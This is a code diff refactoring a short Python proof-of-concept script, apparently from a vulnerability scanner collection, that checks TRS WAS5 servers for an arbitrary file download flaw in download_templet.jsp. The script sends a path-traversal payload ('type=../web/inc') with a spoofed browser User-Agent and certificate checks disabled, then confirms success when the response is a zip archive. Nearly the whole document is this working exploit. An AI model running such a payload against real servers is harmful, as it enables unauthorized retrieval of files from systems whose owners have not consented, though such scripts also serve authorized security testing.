@@ -9,20 +9,13 @@ description: download_templet.jsp参数type存在任意文件下载,下载文件
 import sys
 import requests
 import warnings
-
-
-
-class was5_download_templet:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['TRS was5 download_templet.jsp任意文件下载','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payload = "/was5/admin/template/download_templet.jsp?type=../web/inc"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"x-zip-compressed" in req.headers["Content-Type"]:
@@ -37,5 +30,4 @@ class was5_download_templet:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = was5_download_templet(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
